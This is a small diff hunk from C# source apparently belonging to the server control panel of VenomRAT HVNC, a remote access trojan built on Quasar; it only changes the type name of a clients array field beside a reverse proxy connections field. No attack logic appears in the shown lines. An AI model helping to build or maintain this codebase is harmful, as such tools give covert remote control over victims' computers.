@@ -18,7 +18,7 @@ namespace VenomRAT_HVNC.Quasar.Server.Forms
 
         private ReverseProxyClient[] _openConnections;
 
-        private Client[] clients;
+        private VenomRAT_HVNC.Server.Client[] clients;
 
         private static readonly string[] Sizes = new string[6] { "B", "KB", "MB", "GB", "TB", "PB" };
 
